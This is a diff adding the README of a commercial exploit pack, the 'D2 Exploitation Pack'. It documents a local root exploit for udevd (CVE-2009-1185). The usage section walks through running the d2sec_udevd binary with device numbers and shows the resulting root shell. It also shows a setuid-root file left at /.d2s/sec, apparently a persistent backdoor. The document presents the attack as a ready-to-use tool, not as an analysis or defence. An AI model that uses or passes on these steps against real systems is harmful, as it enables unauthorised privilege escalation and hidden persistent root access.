@@ -1,0 +1,31 @@
+D2 Exploitation Pack
+====================
+
+Copyright (c) 2007-2010 DSquare Security, LLC
+
+
+License information
+-------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Local exploit
+---------------
+
+udevd NETLINK messaging exploit
+
+CVE Name : CVE-2009-1185
+CVE URL  : http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1185
+
+How to use the exploit
+------------------------
+
+$ ls -alp /dev/hda1
+brw-rw---- 1 root disk 3, 1 May 30   15:15 /dev/hda1
+$ ./d2sec_udevd 3 1
+# id
+uid=0(root) gid=0(root) groupes=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),19(log)
+# ls -alp /.d2s/sec
+-rwsr-xr-x 1 root root 15694 May 30 15:18 /.d2s/sec
